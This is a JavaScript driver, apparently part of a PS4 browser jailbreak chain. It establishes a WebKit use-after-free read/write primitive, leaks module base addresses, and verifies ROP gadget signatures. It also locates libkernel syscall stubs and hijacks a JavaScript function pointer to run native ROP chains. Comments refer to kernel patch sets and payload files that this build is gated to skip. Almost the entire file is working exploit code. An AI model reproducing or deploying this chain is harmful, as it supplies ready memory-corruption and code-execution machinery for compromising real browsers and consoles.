// JavaScript | assets/baseline-044r3/mochi-engine.js | PS4 WebKit | userland-only v0.4.4-R3
import { establishPrimitive } from "./core.js?v=1402";
import { installWindowP, pairStatus } from "./mem.js?v=1402";
import { int64 } from "./int64.js?v=1402";
import { offsetsFor, PS4 } from "./ps4_offsets.js?v=1402";

const outEl = document.getElementById("out");
const stateEl = document.getElementById("state");
const lines = [];
let passCount = 0,
  failCount = 0;
let armedEver = false;
const params = new URLSearchParams(location.search);
const HOST_AUDIT_MODE = params.get("stop") === "host" || params.get("stop") === "native" || (params.get("stop") === "apm" || params.get("stop") === "apm-events");
const MOCHI_DIAG = params.get("diag") === "full";
const MOCHI_MODE = params.get("stop");
// Explicit, non-kernel routes only. Unknown or legacy kernel URLs are refused
// before the WebKit primitive is started. This package has no active Afterglow import.
const MOCHI_ROUTE_ALLOWED = (
  (MOCHI_MODE === "primitive" || MOCHI_MODE === "host" || MOCHI_MODE === "native" || MOCHI_MODE === "apm" || MOCHI_MODE === "apm-events") &&
  !params.has("afterglow") && !params.has("kpstep") &&
  !params.has("payload") && !params.has("patch")
);

/* The retry notice. Two things lead here: the chain throws, or it stalls
   without a word. The watchdog covers the second case. It cannot fire when
   the whole WebProcess is gone -- then the screen stays as it is -- but in
   the commoner case, a stuck thread on a live page, the notice appears. */
let lastMark = Date.now();
let retryShown = false;

function showNotice(text) {
  try {
    const box = document.createElement("div");
    box.className = "notice";
    box.textContent = text;
    (document.getElementById("out") || document.body).appendChild(box);
    document.body.classList.add("fail");
  } catch (e) {}
}

function showRetry() {
  if (retryShown) return;
  retryShown = true;
  showNotice("exploit failed - please retry (reopen browser)");
}

const WATCHDOG_MS = 45000;
const watchdog = setInterval(function () {
  if (!allDone && Date.now() - lastMark > WATCHDOG_MS) {
    try { clearInterval(watchdog); } catch (e) {}
    if (MOCHI_DIAG) mark("MOCHI-STOP", "code=WATCHDOG-NO-PROGRESS elapsed_ms=" + WATCHDOG_MS + " webprocess_alive=true");
    showRetry();
  }
}, 5000);

/* The referrer guard. The console's browser restores the page it had open
   last. If that was the armed chain it would run again with nobody in front
   of the screen, so arming requires a step from this folder's landing page.
   The guard lives here rather than in the server, so it holds however the
   files are served. */
const FROM_LANDING = (function () {
  try {
    if (!document.referrer) return false;
    const r = new URL(document.referrer);
    if (r.origin !== location.origin) return false;
    const cameFrom = r.pathname.replace(/[^/]*$/, "");
    const here = location.pathname.replace(/[^/]*$/, "");
    if (cameFrom !== here) return false;
    const file = r.pathname.slice(cameFrom.length);
    return file === "" || file === "index.html";
  } catch (e) {
    return false;
  }
})();

/* A page the browser restored must do nothing at all. Until this sat here,
   the refusal came only after the WebKit stage had already run in full --
   harmless to the kernel, but pointless work on a page nobody asked to run.
   Send it back to the start page instead; from there the ordinary route
   takes over, autostart included, and it arms with a proper referrer and a
   visible countdown. A probe is exempt: it fires nothing and patches
   nothing. */
const SENT_HOME = (function () {
  const want = params.get("afterglow");
  if (!want || want === "probe" || FROM_LANDING) return false;
  try {
    /* Pin the page to the .fail look: the message lives in #msg, which is
       hidden in log mode, and the URL decides whether log mode is on. */
    document.body.className = "fail";
    const msgEl = document.getElementById("msg");
    if (msgEl) {
      msgEl.textContent =
        "Restored by the browser. Nothing has been run -- " +
        "going back to the start page.";
    }
  } catch (e) {}
  /* replace(), not assign(): the refused page must not stay in the history,
     or stepping back lands straight on it again. */
  setTimeout(function () {
    try {
      location.replace("index.html");
    } catch (e) {}
  }, 1500);
  return true;
})();

const PROBE_MODE = params.get("probe") === "1";
const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";

const VERBOSE = params.get("verbose") === "1";
const PROSE = [
  / -- /,
  /\.\s/,
  /;\s/,
  /,\s+(which|so|and that|because|since|as that)\s/,
  /\s+(because|rather than|instead of|so that|which is|which means|which the|so the)\s/,
  /\s+so\s+[a-z]/,
  /\s+\([a-z][^)]{40,}\)/,
];
function terse(s) {
  if (VERBOSE || MOCHI_DIAG || s == null) return s;
  s = String(s);
  for (const re of PROSE) {
    const m = re.exec(s);
    if (m && m.index > 0) s = s.slice(0, m.index);
  }
  s = s.replace(/\s+$/, "");
  if (s.length > 140) s = s.slice(0, 140) + "...";
  return s;
}

const SHOW_LOG = params.get("log") === "1";
const MOCHI_CORE_SHA256 = "cfd9f607254913958d506627e35b1a72f7337fc39f08d3f560767e7e47797f87";
const MOCHI_MEM_SHA256 = "e58704779bc896cf25c371181f7986d368918d4198a7f30d8d8a947b5fafc08b";

/* UPDATE_RAM_BOX */
const ramBox =
  document.getElementById("ramBox");

function formatMB(bytes) {
  bytes = Number(bytes || 0);

  if (bytes <= 0) {
    return "0MB";
  }

  return (
    (bytes / (1024 * 1024)).toFixed(2) +
    "MB"
  );
}

function updateRamBox() {
  if (!ramBox) {
    return;
  }

  let heapText =
    "JS heap: N/A";

  try {
    if (
      performance &&
      performance.memory
    ) {
      const used =
        Number(
          performance.memory.usedJSHeapSize || 0,
        );

      const limit =
        Number(
          performance.memory.jsHeapSizeLimit || 0,
        );

      if (limit > 0) {
        const percent =
          used / limit * 100;

        heapText =
          "JS heap: " +
          percent.toFixed(1) +
          "% (" +
          formatMB(used) +
          "/" +
          formatMB(limit) +
          ")";
      } else {
        heapText =
          "JS heap: " +
          formatMB(used);
      }
    }
  } catch (ramError) {
    heapText =
      "JS heap: error";
  }

  let coreText =
    "core: N/A";

  try {
    const info =
      globalThis.__CORE_MEM_INFO;

    if (info) {
      coreText =
        "core: slots=" +
        info.slots +
        " drain=" +
        info.drainCount +
        "x" +
        formatMB(info.drainSize) +
        " est=" +
        formatMB(info.estimatedBytes) +
        " mem=" +
        info.memLevel;
    }
  } catch (coreError) {
    coreText =
      "core: error";
  }

  ramBox.textContent =
    heapText + " | " + coreText;
}

if (ramBox) {
  updateRamBox();

  setInterval(
    updateRamBox,
    500,
  );
}

/* Not when the page is on its way home: log mode hides #msg, which is
   where that notice sits. */
if (SHOW_LOG && !SENT_HOME && document.body) document.body.className = "log";
function finishUI(ok) {
  if (SHOW_LOG || !document.body) return;
  const m = document.getElementById("msg");
  if (m)
    m.textContent = ok
      ? "DONE"
      : armedEver
        ? "Restart your console"
        : "Refresh the page and run again";
  document.body.className = ok ? "done" : "fail";
}
function mark(tag, detail) {
  lastMark = Date.now();
  const raw = detail;
  detail = terse(detail);

  lines.push(
    tag +
    (
      detail == null || detail === ""
        ? ""
        : "  " + detail
    ),
  );
  // A buffered, opt-in LAN collector; no synchronous network call in the exploit path.
  if (MOCHI_DIAG) {
    try { if (window.MochiCapture) window.MochiCapture.push(tag, String(raw == null ? "" : raw)); }
    catch (ignored) {}
  }

  if (lines.length > (MOCHI_DIAG ? 1500 : 600)) {
    lines.splice(0, lines.length - (MOCHI_DIAG ? 1500 : 600));
  }

  if (SHOW_LOG && outEl) {
    outEl.textContent =
      lines.join("\n");

    outEl.scrollTop =
      outEl.scrollHeight;
  }

}

function trace(tag, detail) {
  if (VERBOSE) mark(tag, detail);
}
function state(t, c) {
  if (!SHOW_LOG || !stateEl) return;
  stateEl.textContent = t;
  stateEl.className = c || "";
}
function check(name, ok, detail) {
  if (HOST_AUDIT_MODE && /^(kernel-table-present|kpatch-table-present|payload-table-present)$/.test(name)) {
    mark("HOST-NOT-TESTED", name + " (outside userland host scope)");
    return true;
  }
  if (ok) {
    passCount++;
    mark("PROOF-OK", name + (detail ? "  " + detail : ""));
  } else {
    failCount++;
    mark("PROOF-FAIL", name + (detail ? "  " + detail : ""));
  }
  return ok;
}

const SYS = {
  open: 5,
  kqueue: 362,
  kevent: 363,
  getpid: 20,
  getuid: 0x18,
  close: 6,
  socket: 97,
  socketpair: 0x87,
  getsockopt: 118,
  setsockopt: 0x69,
  mmap: 477,
  munmap: 73,
  thr_self: 432,
  getgroups: 79,
  getgid: 47,
  cpuset_getaffinity: 487,
  cpuset_setaffinity: 488,
  aio_multi_poll: 664,
  aio_multi_delete: 662,
  getegid: 43,
  aio_multi_wait: 663,
  aio_multi_cancel: 666,
  aio_submit_cmd: 669,
  write: 4,
  sysctl: 202,
  kill: 37,
  getppid: 39,
};
const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
const keepAlive = [];
let mainMf = null,
  mainOrig = null,
  mainArmed = false;
let pinRestore = null;

let jbRestoreHook = null;
let allDone = false,
  jailbroken = false,
  kpatched = false,
  payloadRunning = false;

(async function () {
  if (SENT_HOME) return;
  if (!MOCHI_ROUTE_ALLOWED) {
    mark("MOCHI-STOP", "code=ROUTE-DISABLED userland-only; valid-stop=primitive|host|native|apm; no-kernel-launch");
    state("This research build only runs WebKit, host or native checks", "bad");
    try { clearInterval(watchdog); } catch (ignored) {}
    return;
  }
  let p = null;

  const opened = [];
  let closeFd = null;
  try {
    const { key, off } = offsetsFor(navigator.userAgent);
    mark("BUILD", "jb=skipjb2 base=ef1670a");
    mark("FW", key || "(not a PS4 UA)");
    if (!off) {
      /* NONPS4-DEBUG */
      try {
        document.body.classList.add("log");
      } catch (e) {}

      state("not a PS4 browser - debug mode", "warn");

      mark(
        "NONPS4-DEBUG",
        "ua=" + (navigator.userAgent || "unknown"),
      );

      try {
        mark(
          "NONPS4-OFFSETS",
          "supported=" + Object.keys(PS4).join(","),
        );
      } catch (e) {
        mark("NONPS4-OFFSETS", "error=" + String(e));
      }

      try {
        const off14 = PS4["14.00"];

        if (off14) {
          mark(
            "NONPS4-14",
            "present " +
            "webkit=" + off14.wk_expm1_builtin +
            " poprdi=0x" + off14.wk_POP_RDI_RET.toString(16) +
            " poprsi=0x" + off14.wk_POP_RSI_RET.toString(16) +
            " poprdx=0x" + off14.wk_POP_RDX_RET.toString(16),
          );
        } else {
          mark("NONPS4-14", "entry=missing");
        }
      } catch (e) {
        mark("NONPS4-14", "error=" + String(e));
      }

      try {
        const info = globalThis.__CORE_MEM_INFO;

        if (info) {
          mark(
            "NONPS4-CORE",
            "hx1400=" + info.hx1400 +
            " memLevel=" + info.memLevel +
            " slots=" + info.slots +
            " drain=" + info.drainCount +
            " est=" + info.estimatedBytes,
          );
        } else {
          mark("NONPS4-CORE", "info=missing");
        }
      } catch (e) {
        mark("NONPS4-CORE", "error=" + String(e));
      }

      allDone = true;
      return;
    }
    const fwKey = key || "unknown";
    // Code-provenance comparison, not a live module equality assertion.
    // The 14.02 profile in ps4_offsets.js inherits the 14.00 WebKit profile,
    // which in turn inherits 13.52. A successful host test separately checks
    // the *selected* live gadget bytes; it does not establish whole-module identity.
    if (MOCHI_DIAG) {
      var profile14 = PS4["14.00"] || {};
      var profile1402 = PS4["14.02"] || {};
      var webkitKeys = Object.keys(profile14).filter(function(k) {
        return k.indexOf("wk_") === 0 || k === "k__error" || k === "k_scan_stage1";
      });
      var sameFields = webkitKeys.filter(function(k) {
        return profile14[k] === profile1402[k];
      }).length;
      mark("MOCHI-WEBKIT-PROFILE", "fw=" + fwKey + " same-reference-fields=" +
        sameFields + "/" + webkitKeys.length +
        " inherited-from=14.00/13.52 equality=SOURCE-TABLE-ONLY");
      mark("MOCHI-FW-EVIDENCE", "firmware=user-agent-reported module-version=NOT-ATTESTED kernel-vulnerability=NOT-TESTED");
    }

    // How many tries the WebKit stage gets. An attempt costs nothing in the
    // kernel -- this stage is a userland UAF in JavaScript, and a miss is
    // simply repeated. About one in three lands, so a low ceiling gives up on
    // a page that would have worked; this one puts that failure well under a
    // tenth of a percent.
    const ATTEMPTS = Math.max(1, parseInt(params.get("attempts") || "8", 10) || 8);

    const PRIMITIVE_ONLY = params.get("stop") === "primitive";
    const HOST_VALIDATE = params.get("stop") === "host";
    const APM_EVENTS = params.get("stop") === "apm-events";
    const APM_REACH = params.get("stop") === "apm" || APM_EVENTS;
    const NATIVE_VALIDATE = params.get("stop") === "native" || APM_REACH;
    if (MOCHI_DIAG) {
      mark("MOCHI-RUN", "v0.4.4-R3 mode=" + MOCHI_MODE + " attempts=" + ATTEMPTS + " firmware-user-agent=" + fwKey + " original-engine=v0.4.4 inherited-webkit=13.52/14.00");
      mark("MOCHI-BOUNDARY", "userland-only afterglow-not-loaded kernel-trigger-disabled");
      mark("MOCHI-BUILD", "v0.4.4-R3 core-sha256=" + MOCHI_CORE_SHA256 + " mem-sha256=" + MOCHI_MEM_SHA256 + " hash-values=packaging-reference-not-live-verified");
      mark("MOCHI-STEP", "01 primitive start; native-call=no; kernel=no");
    }

    if (PRIMITIVE_ONLY) {
      state("testing WebKit primitive...", "warn");

      await new Promise(function (resolve) {
        setTimeout(resolve, 0);
      });

      const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;

      const carrier = await establishPrimitive({
        maxAttempts: ATTEMPTS,
        onEvent: function (tag, detail, attempt) {
          const writer = PRIMITIVE_LOUD.test(tag) ? mark : trace;

          writer(
            tag,
            (attempt != null ? "[" + attempt + "] " : "") +
              (detail || ""),
          );
        },
      });

      installWindowP(carrier, { promote: false });

      const pp = window.p;

      const cell = pp.leakval(Math.expm1);

      const nativeFn = pp.read8(
        pp.read8(cell.add32(0x18)).add32(
          off.wk_JSFunction_m_function,
        ),
      );

      const webkitBase = nativeFn.sub32(
        off.wk_expm1_builtin,
      );

      const aligned = function (value) {
        return value.hi > 0 && (value.low & 0x3fff) === 0;
      };

      const primitiveOk = aligned(webkitBase);

      try {
        const errorFn = pp.read8(
          webkitBase.add32(off.wk___imp___error),
        );

        const libkernelBase = errorFn.sub32(
          off.k__error,
        );

        mark(
          "BASES",
          "webkit=" + webkitBase +
          " libkernel=" + libkernelBase,
        );
      } catch (baseError) {
        mark(
          "BASES",
          "webkit=" + webkitBase +
          " libkernel=unresolved",
        );
      }

      mark(
        "PRIMITIVE-ONLY",
        primitiveOk ? "PASS" : "FAIL",
      );

      allDone = true;
      mark("MOCHI-TERMINAL", "mode=primitive result=" + (primitiveOk ? "PASS" : "FAIL") + " native=no kernel=no");
      try { clearInterval(watchdog); } catch (ignored) {}
      finishUI(primitiveOk);
      return;
    }


    const DO_JB = params.get("jb") !== "0";
    const DO_PATCH = params.get("patch") !== "0";
    const DO_PAYLOAD = params.get("payload") !== "0";
    const SKIPJB = params.get("skipjb") !== "0";

    const KEEP_JB = params.get("keepjb") === "1";

    // afterglow brings its own kernel stage, so this run does not need the
    // host's kernel table at all.
    const OWN_KERNEL_STAGE = HOST_AUDIT_MODE;
    const NEED_K = OWN_KERNEL_STAGE ? [] : [
      "k_idt_rsvd",
      "k_oid_kern_file",
      "k_oid_maxfilesperproc",
      "k_oid_maxprocperuid",
      "k_oid_maxfiles",
      "k_arg1_maxfilesperproc",
      "k_arg1_maxprocperuid",
      "k_arg1_maxfiles",
      "k_prison0",
      "k_rootvnode",
    ];
    const missing = NEED_K.filter((k) => off[k] === undefined);
    if (
      !check(
        "kernel-table-present",
        missing.length === 0 || PROBE_MODE,
        "fw=" +
          fwKey +
          " missing=[" +
          missing.join(",") +
          "]" +
          " -- dump this firmware with kdump5.html and derive its table" +
          " with tools/kderive.py; stage=pre_primitive",
      )
    )
      return;

    // With its own kernel stage, afterglow carries its own patch set
    // (patchset.bin) and picks the payload from ?mode. The host's names for
    // these never applied here.
    const KPATCH_FILE = OWN_KERNEL_STAGE
      ? "patchset.bin (afterglow)"
      : "patches/" + (off.kpatch || fwKey.replace(".", "") + ".bin");
    const PAYLOAD_FILE = OWN_KERNEL_STAGE
      ? "hen.bin|goldhen.bin (per ?mode)"
      : off.payload || "payload.bin";
    const needPatch = OWN_KERNEL_STAGE ? [] : ["k_sysent_661", "k_jmp_rsi"].filter(
      (k) => off[k] === undefined,
    );
    if (
      !check(
        "kpatch-table-present",
        !DO_PATCH || PROBE_MODE || needPatch.length === 0,
        "missing=[" +
          needPatch.join(",") +
          "] blob=" +
          KPATCH_FILE +
          " -- build it from patches/<fw>.c, see patches/1300.c",
      )
    )
      return;
    const needPl = OWN_KERNEL_STAGE ? [] : ["wk___imp_pthread_create", "k_pthread_create"].filter(
      (k) => off[k] === undefined,
    );
    if (
      !check(
        "payload-table-present",
        !DO_PAYLOAD || PROBE_MODE || needPl.length === 0,
        "missing=[" + needPl.join(",") + "] payload=" + PAYLOAD_FILE,
      )
    )
      return;
    mark("FW-STATUS", off.fw_status || "none");
    mark(
      "FW-KTABLE",
      "idt_rsvd=" +
        (
          off.k_idt_rsvd === undefined
            ? "undefined"
            : "0x" + off.k_idt_rsvd.toString(16)
        ) +
      " prison0=" +
        (
          off.k_prison0 === undefined
            ? "undefined"
            : "0x" + off.k_prison0.toString(16)
        ) +
      " rootvnode=" +
        (
          off.k_rootvnode === undefined
            ? "undefined"
            : "0x" + off.k_rootvnode.toString(16)
        ) +
      " kpatch=" +
        KPATCH_FILE +
      " payload=" +
        PAYLOAD_FILE +
      " src=ps4_offsets.js",
    );

    // ---- benign-miss auto-retry (reads only, before any kernel write) ----
    // A passA/passB "no crossing" is a recoverable reclaim miss in the READ
    // phase -- no kernel .data/.text has been touched yet, so reloading and
    // retrying is safe. The counter lives in sessionStorage so it survives
    // the reload and is cleared the moment the read phase succeeds, so a
    // later manual run always starts fresh. NEVER call retryBenign() after a
    // kernel write: a reload would re-enter with the kernel already modified.
    // A hard KP (a total reclaim miss that faults inside the cancel walk)
    // cannot be caught here and still needs a reboot -- this only recovers
    // the benign, detectable misses.
    const retryArg = parseInt(params.get("retry") || "", 10);
    const RETRY_MAX = Number.isFinite(retryArg) && retryArg >= 0 ? retryArg : 4;
    const RETRY_KEY = "jb1352-read-retry";
    const retryCount = () => {
      try {
        const v = parseInt(sessionStorage.getItem(RETRY_KEY) || "0", 10);
        return Number.isFinite(v) && v > 0 ? v : 0;
      } catch (e) {
        return 0;
      }
    };
    const clearRetry = () => {
      try {
        sessionStorage.removeItem(RETRY_KEY);
      } catch (e) {}
    };
    const retryBenign = (why) => {
      const n = retryCount();
      if (n >= RETRY_MAX) {
        mark(
          "AUTO-RELOAD-GIVEUP",
          "why=" + why + " reloads=" + n + " -- reboot and try again",
        );
        return false;
      }
      let stored = -1;
      try {
        sessionStorage.setItem(RETRY_KEY, String(n + 1));
        stored = parseInt(sessionStorage.getItem(RETRY_KEY) || "-1", 10);
      } catch (e) {
        stored = -1;
      }
      if (stored !== n + 1) {
        mark(
          "AUTO-RELOAD-NO-STORAGE",
          "why=" + why + " wrote=" + (n + 1) + " read=" + stored,
        );
        return false;
      }
      mark("AUTO-RELOAD", "why=" + why + " reload=" + (n + 1) + "/" + RETRY_MAX);
      setTimeout(() => {
        try {
          location.reload();
        } catch (e) {}
      }, 400);
      return true;
    };
    if (retryCount() > 0)
      mark("AUTO-RELOAD-RESUME", "reload=" + retryCount() + "/" + RETRY_MAX);

    state("running the primitive...", "warn");
    await new Promise((r) => setTimeout(r, 0));

    const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
    const carrier = await establishPrimitive({
      maxAttempts: ATTEMPTS,
      onEvent: (t, d, a) =>
        (PRIMITIVE_LOUD.test(t) ? mark : trace)(
          t,
          (a != null ? "[" + a + "] " : "") + (d || ""),
        ),
    });
    installWindowP(carrier, { promote: false });
    if (!window.p) throw new Error("window.p was not installed");
    p = window.p;
    mark(
      "PAIR-STATUS",
      "state=" +
        pairStatus.state +
        " promoted=" +
        pairStatus.promoted +
        "   (promotion disabled: backing allocations retained; actual byte count unmeasured)",
    );
    mark("PRIMITIVE-OK", "");

    const cell = p.leakval(Math.expm1);
    const nativeFn = p.read8(
      p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function),
    );
    const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
    const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
    let libkernelBase = errorFn.sub32(off.k__error);

    if (OWN_KERNEL_STAGE || PROBE_MODE) {
      const libkernelAdjust =
        libkernelBase.low & 0x3fff;

      if (libkernelAdjust !== 0) {
        libkernelBase =
          libkernelBase.sub32(
            libkernelAdjust,
          );

        mark(
          "HX1400-LIBKERNEL-ALIGN",
          "adjust=0x" +
          libkernelAdjust.toString(16) +
          " base=" +
          libkernelBase,
        );
      }
    }

    mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
    const aligned = (v) => v.hi > 0 && (v.low & 0x3fff) === 0;
    if (
      !check(
        "module-bases-0x4000-aligned",
        aligned(webkitBase) && aligned(libkernelBase),
        "",
      )
    ) {
      if (HOST_VALIDATE) mark("HOST-VALIDATION", "FAIL module-bases-alignment");
      return;
    }

    const G = {};
    const GAD = [
      ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3]],
      ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3]],
      ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3]],
      ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3]],
      ["POP_R8_RET", off.wk_POP_R8_RET, [null, 0x58, 0xc3]],
      ["POP_R9_RET", off.wk_POP_R9_RET, [null, 0x59, 0xc3]],
      ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3]],
      ["LEAVE_RET", off.wk_LEAVE_RET, [0xc9, 0xc3]],
      [
        "MOV_RDI_RAX_RET",
        off.wk_MOV_QWORD_PTR_RDI_RAX_RET,
        [0x48, 0x89, 0x07, 0xc3],
      ],
      ["G0", off.wk_MOV_RDI_RSI_30_CALL, [0x48, 0x8b, 0x7e, 0x30]],
      ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18, [0x58, 0x48, 0x8b, 0x07]],
      ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10, [0x55, 0x48, 0x89, 0xe5]],
      ["G3", off.wk_MOV_RDI_RAX_8_CALL_20, [0x48, 0x8b, 0x78, 0x08]],
      [
        "G4",
        off.wk_MOV_RDX_RAX_18_CALL_10,
        [0x48, 0x8b, 0x50, off.pivot_view_sp],
      ],
      ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [0x52, 0x5c, 0xc3]],
    ];
    let gated = 0;
    for (const [nm, rva, pat] of GAD) {
      const a = webkitBase.add32(rva);
      let good = true;
      for (let i = 0; i < pat.length; ++i) {
        if (pat[i] === null) continue;
        if (p.read1(a.add32(i)) !== pat[i]) {
          good = false;
          break;
        }
      }
      if (good) {
        G[nm] = a;
        gated++;
      } else mark("GADGET-BAD", nm);
    }
    if (
      !check(
        "gadget-table-fits-module",
        gated === GAD.length,
        gated + "/" + GAD.length,
      )
    ) {
      if (HOST_VALIDATE) mark("HOST-VALIDATION", "FAIL gadget-signatures=" + gated + "/" + GAD.length);
      return;
    }
    const argGadget = [
      G.POP_RDI_RET,
      G.POP_RSI_RET,
      G.POP_RDX_RET,
      G.POP_RCX_RET,
      G.POP_R8_RET,
      G.POP_R9_RET,
    ];

    const stubAddr = new Map();
    let seeded = 0;
    if (off.k_stubs) {
      for (const numStr in off.k_stubs) {
        const num = +numStr,
          o = off.k_stubs[numStr];
        const v = p.read8(libkernelBase.add32(o));
        if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49) continue;
        if (((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0 !== num)
          continue;
        stubAddr.set(num, libkernelBase.add32(o));
        seeded++;
      }
    }
    const requiredSyscalls = Object.keys(SYS).filter((k) => {
      if (k === "open") return APM_REACH;
      if (k === "kqueue" || k === "kevent") return APM_EVENTS;
      return true;
    });
    const need = new Set(
      requiredSyscalls
        .map((k) => SYS[k])
        .filter((n) => !stubAddr.has(n)),
    );
    let scanned = 0;
    for (let o = 0; o < off.k_scan_stage1 && need.size; o += 16) {
      const v = p.read8(libkernelBase.add32(o));
      if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49) continue;
      const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
      if (!need.has(num)) continue;
      stubAddr.set(num, libkernelBase.add32(o));
      need.delete(num);
      scanned++;
    }
    mark("STUBS", "seeded=" + seeded + " scanned=" + scanned);
    if (MOCHI_DIAG) mark("MOCHI-STEP", "02 host byte-signatures=" + gated + "/" + GAD.length + " stubs-seeded=" + seeded + " stubs-scanned=" + scanned);
    const miss = requiredSyscalls.filter((k) => !stubAddr.has(SYS[k]));
    if (!check("syscall-page-needs-stub", miss.length === 0, miss.join(","))) {
      if (HOST_VALIDATE) {
        mark("HOST-VALIDATION", "FAIL syscall-stubs-missing=" + miss.join(","));
        state("Host validation incomplete: syscall stubs missing", "bad");
        allDone = true;
      }
      return;
    }

    // Host validation ends before the native-call bridge, ROP context,
    // kernel trigger, or payload-handling stages are entered.
    if (HOST_VALIDATE) {
      mark("MOCHI-WEBKIT-COMPAT", "gadget-bytes=" + gated + "/" + GAD.length + " on-device-check=PASS full-module-identity=UNKNOWN");
      mark("HOST-VALIDATION", "PASS scoped=module-bases+15-gadget-signatures+syscall-stubs");
      mark("HOST-BOUNDARY", "no-native-call no-kernel-attempt no-payload");
      state("Host signatures and syscall stubs passed; no kernel execution", "good");
      allDone = true;
      mark("MOCHI-TERMINAL", "mode=host result=PASS native=no kernel=no");
      try { clearInterval(watchdog); } catch (ignored) {}
      finishUI(true);
      return;
    }

    function bufAddr(ab) {
      const c = p.leakval(ab);
      return p.read8(
        p
          .read8(c.add32(off.wk_ArrayBuffer_m_impl))
          .add32(off.wk_ArrayBuffer_m_contents_m_data),
      );
    }
    function put(dv, at, v) {
      if (typeof v === "number") {
        dv.setUint32(at, v >>> 0, true);
        dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
      } else {
        dv.setUint32(at, v.low >>> 0, true);
        dv.setUint32(at + 4, v.hi >>> 0, true);
      }
    }
    const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);
    function makeCtx() {
      const sb = new ArrayBuffer(0x20),
        pb = new ArrayBuffer(PB_SIZE);
      const kb = new ArrayBuffer(0x2000),
        fb = new ArrayBuffer(0x40);
      keepAlive.push(sb, pb, kb, fb);
      const c = {
        storeDv: new DataView(sb),
        pivotDv: new DataView(pb),
        stackDv: new DataView(kb),
        frameDv: new DataView(fb),
        stackU8: new Uint8Array(kb),
        frameU8: new Uint8Array(fb),
      };
      keepAlive.push(
        c.storeDv,
        c.pivotDv,
        c.stackDv,
        c.frameDv,
        c.stackU8,
        c.frameU8,
      );
      c.S = bufAddr(sb);
      c.P = bufAddr(pb);
      c.K = bufAddr(kb);
      c.F = bufAddr(fb);
      put(c.storeDv, 0x00, G.G1);
      put(c.storeDv, 0x08, c.P);
      put(c.storeDv, 0x10, G.G3);
      put(c.storeDv, 0x18, G.G2);
      put(c.pivotDv, 0x00, c.P);
      put(c.pivotDv, 0x10, G.G5);
      put(c.pivotDv, 0x20, G.G4);
      return c;
    }
    function layout(c, target, args) {
      c.stackU8.fill(0);
      c.frameU8.fill(0);
      const insts = [];
      for (let i = 0; i < args.length; ++i) {
        insts.push(argGadget[i]);
        insts.push(args[i]);
      }
      const targetIdx = insts.length;
      insts.push(target);
      insts.push(G.POP_RDI_RET);
      insts.push(c.F);
      insts.push(G.MOV_RDI_RAX_RET);
      insts.push(G.POP_RAX_RET);
      insts.push(JSVALUE_UNDEFINED);
      insts.push(G.LEAVE_RET);
      let at = 0x2000 - 8 * insts.length;
      if (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
      for (let i = 0; i < insts.length; ++i)
        put(c.stackDv, at + 8 * i, insts[i]);
      put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
    }
    const M = makeCtx();
    mainMf = p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
    mainOrig = p.read8(mainMf);
    const pivotObj = {};
    keepAlive.push(pivotObj);
    const pivotCell = p.leakval(pivotObj);
    p.write8(mainMf, G.G0);
    mainArmed = true;
    function callAddr(target, args) {
      layout(M, target, args);
      const saved = p.read8(pivotCell);
      p.write8(pivotCell, M.S);
      try {
        Math.expm1(pivotObj);
      } finally {
        p.write8(pivotCell, saved);
      }
      return {
        lo: M.frameDv.getUint32(0, true),
        hi: M.frameDv.getUint32(4, true),
        i32: M.frameDv.getUint32(0, true) | 0,
      };
    }
    // Build the chain up front, so that inside the window there is nothing
    // left but one store, one pointer and the trigger. Assembling the 1512
    // slots costs milliseconds, and those milliseconds fall inside it.
    function prepareMany(calls) {
      const c = M, RET = G.POP_RDI_RET.add32(1);
      const insts = [];
      for (let k = 0; k < calls.length; ++k) {
        const args = calls[k][1];
        for (let i = 0; i < args.length; ++i) { insts.push(argGadget[i]); insts.push(args[i]); }
        insts.push(calls[k][0]);
        if ((args.length * 2 + 1) % 2 === 1) insts.push(RET);
      }
      insts.push(G.POP_RDI_RET);
      insts.push(c.F);
      insts.push(G.MOV_RDI_RAX_RET);
      insts.push(G.POP_RAX_RET);
      insts.push(JSVALUE_UNDEFINED);
      insts.push(G.LEAVE_RET);
      let at = 0x2000 - 8 * insts.length;
      if (at < 0x40) throw new Error("prepareMany: " + calls.length + " does not fit");
      if (((c.K.low + at) & 0xf) !== 0) at -= 8;
      const bytes = new Uint8Array(8 * insts.length);
      const bdv = new DataView(bytes.buffer);
      for (let i = 0; i < insts.length; ++i) put(bdv, 8 * i, insts[i]);
      keepAlive.push(bytes, bdv);
      return { bytes: bytes, at: at, sp: c.K.add32(at) };
    }

    function runPrepared(prep) {
      const c = M;
      c.frameU8.fill(0);
      c.stackU8.set(prep.bytes, prep.at);
      put(c.pivotDv, off.pivot_view_sp, prep.sp);
      const saved = p.read8(pivotCell);
      p.write8(pivotCell, M.S);
      Math.expm1(pivotObj);
      p.write8(pivotCell, saved);
      return {
        lo: M.frameDv.getUint32(0, true),
        hi: M.frameDv.getUint32(4, true),
        i32: M.frameDv.getUint32(0, true) | 0,
      };
    }
